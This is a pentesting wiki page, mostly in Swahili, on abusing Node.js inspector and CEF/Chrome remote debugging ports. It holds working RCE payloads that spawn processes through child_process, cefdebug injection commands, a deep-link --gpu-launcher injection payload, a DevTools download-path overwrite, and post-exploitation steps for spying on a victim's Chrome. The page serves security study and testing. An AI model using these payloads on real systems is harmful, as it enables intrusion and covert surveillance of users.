# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

## Taarifa za Msingi

[From the docs](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Inapoanzishwa kwa switch ya `--inspect`, process ya Node.js husikiliza debugging client. Kwa **default**, itasikiliza kwenye host na port **`127.0.0.1:9229`**. Kila process pia hupewa **UUID** **ya kipekee**.

Inspector clients lazima zijue na zibainishe anwani ya host, port, na UUID ili kuunganisha. URL kamili itaonekana kama `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

> [!WARNING]
> Kwa kuwa **debugger ina full access kwenye Node.js execution environment**, malicious actor anayeweza kuunganisha kwenye port hii anaweza kuweza kutekeleza arbitrary code kwa niaba ya Node.js process (**potential privilege escalation**).

Kuna njia kadhaa za kuanzisha inspector:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Unapoanzisha process inayokaguliwa, kitu kama hiki kitaonekana:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Processes based on **CEF** (**Chromium Embedded Framework**) kama hii yanahitaji kutumia param: `--remote-debugging-port=9222` ili kufungua **debugger** (ulinzi wa SSRF hubaki kuwa karibu sawa). Hata hivyo, badala ya kutoa session ya **NodeJS** **debug**, watawasiliana na browser kwa kutumia [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), ambayo ni interface ya ku-control browser, lakini hakuna RCE ya moja kwa moja.

Unapoanzisha browser iliyo katika hali ya debug, kitu kama hiki kitaonekana:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Vivinjari, WebSockets na same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Tovuti zinazofunguka kwenye web-browser zinaweza kutuma maombi ya WebSocket na HTTP chini ya security model ya browser. **Initial HTTP connection** ni muhimu ili **kupata unique debugger session id**. **Same-origin-policy** **huzuia** tovuti kuweza kutengeneza **HTTP connection hii**. Kwa security ya ziada dhidi ya [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js huthibitisha kwamba **'Host' headers** za connection zinabainisha ama **IP address**, **`localhost`** au **`localhost6`** kwa usahihi.

> [!TIP]
> **Hatua hii ya usalama huzuia kum-exploit inspector** ili ku-run code kwa **kutuma tu HTTP request** (jambo ambalo lingewezekana kwa kutumia SSRF vuln).

### Kuanzisha inspector katika running processes

Unaweza kutuma **signal SIGUSR1** kwa running nodejs process ili kuifanya **ianzishe inspector** kwenye default port. Hata hivyo, kumbuka kwamba unahitaji kuwa na privileges za kutosha; kwa hiyo, hii inaweza kukupa **privileged access to information ndani ya process**, lakini si direct privilege escalation.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Hii ni muhimu kwenye containers kwa sababu **kuzima process na kuanzisha nyingine** yenye `--inspect` **si chaguo**, kwa sababu **container** **itauawa** pamoja na process.

### Kuunganisha kwenye inspector/debugger

Ili kuunganisha kwenye **browser inayotumia Chromium**, URLs za `chrome://inspect` au `edge://inspect` zinaweza kufikiwa kwa Chrome au Edge, mtawalia. Kwa kubofya kitufe cha Configure, inapaswa kuhakikisha kuwa **target host na port** zimeorodheshwa kwa usahihi. Picha inaonyesha mfano wa Remote Code Execution (RCE):

![Baada ya URL ya kufikia debugger kuonekana. mfano: ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Kuunganisha kwenye inspector/debugger: Ili kuunganisha kwenye browser inayotumia Chromium, ...](<../../images/image (674).png>)

Kwa kutumia **command line**, unaweza kuunganisha kwenye debugger/inspector kwa:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Tool [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), inaruhusu **kutafuta inspectors** zinazoendesha locally na **inject code** ndani yake.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Kumbuka kwamba **NodeJS RCE exploits hazitafanya kazi** ukiunganishwa kwenye browser kupitia [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (unahitaji kuangalia API ili kupata mambo ya kuvutia ya kufanya nayo).

## RCE in NodeJS Debugger/Inspector

> [!TIP]
> Ikiwa umefika hapa ukitafuta jinsi ya kupata [**RCE kutoka kwa XSS katika Electron tafadhali angalia ukurasa huu.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Baadhi ya njia za kawaida za kupata **RCE** unapoweza **kuunganisha** kwenye **inspector** ya Node ni kutumia kitu kama hiki (inaonekana kwamba hii **haitafanya kazi katika connection ya Chrome DevTools protocol**):
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

Unaweza kuangalia API hapa: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
Katika sehemu hii nitaorodhesha tu mambo ya kuvutia ambayo nimegundua watu wameyatumia ku-exploit protocol hii.

### Parameter Injection via Deep Links

Katika [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino security iligundua kuwa application iliyojengwa kwa kutumia CEF **registered a custom UR**I kwenye system (workspaces://index.html), iliyopokea URI nzima na kisha **launched the CEF based applicatio**n ikiwa na configuration iliyokuwa inaundwa kwa sehemu kutokana na URI hiyo.

Iligunduliwa kuwa URI parameters zilikuwa URL decoded na kutumika ku-launch CEF basic application, hivyo kumruhusu user ku-**inject** flag **`--gpu-launcher`** kwenye **command line** na ku-execute vitu vya kiholela.

Kwa hiyo, payload kama hii:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Itatekeleza calc.exe.

### Kubadilisha Faili

Badilisha folda ambako **faili zilizopakuliwa zitaenda kuhifadhiwa** na upakue faili ili **kubadilisha** **source code** inayotumiwa mara kwa mara ya application kwa **code yako hasidi**.
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE na exfiltration

Kulingana na post hii: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) inawezekana kupata RCE na kufanya exfiltration ya internal pages kutoka theriver.

### Post-Exploitation

Katika mazingira halisi na **baada ya ku-compromise** PC ya mtumiaji inayotumia browser inayotegemea Chrome/Chromium, unaweza kuanzisha Chrome process yenye **debugging ikiwa imewashwa na ku-port-forward debugging port** ili uweze kuifikia. Kwa njia hii utaweza **kukagua kila kitu ambacho victim anafanya kwa Chrome na kuiba taarifa nyeti**.

Njia ya stealth ni **kuzima kila Chrome process** kisha kuita kitu kama hiki
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Marejeleo

- [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
- [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
- [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

{{#include ../../banners/hacktricks-training.md}}
